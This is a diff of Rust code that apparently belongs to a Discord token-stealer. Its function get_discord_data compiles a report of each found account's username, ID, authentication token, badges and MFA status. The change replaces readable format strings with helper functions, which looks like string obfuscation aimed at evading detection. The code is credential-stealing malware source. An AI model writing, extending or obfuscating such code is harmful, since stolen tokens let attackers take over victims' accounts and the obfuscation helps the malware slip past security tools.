@@ -298,14 +298,14 @@ pub async fn get_discord_data(client: &reqwest::Client) -> (Vec<DiscordAccount>,
     let mut discord_content = String::new();
     let mut embeds: Vec<Value> = Vec::new();
 
-    let mut summary_description = format!("{} Discord accounts found\n", discord_accounts.len());
+    let mut summary_description = format!("{}{}", discord_accounts.len(), s_discord_accounts_found());
 
     for acc in &discord_accounts {
         let acc_badges = badge_emojis(acc.public_flags);
         let acc_badges_str = if acc_badges.is_empty() { "None" } else { &acc_badges.join(" ") };
         let mfa_str = if acc.mfa_enabled { "enabled" } else { "disabled" };
         discord_content.push_str(&format!(
-            "Username: {}\nID: {}\nToken: {}\nBadges: {}\nMFA: {}\n{}\n",
+            s_discord_report_fmt(),
             acc.username, acc.id, acc.token, acc_badges_str, mfa_str, "-".repeat(30)
         ));
         summary_description.push_str(&format!("`{}` - {} - MFA: {}\n", acc.username, acc_badges_str, mfa_str));
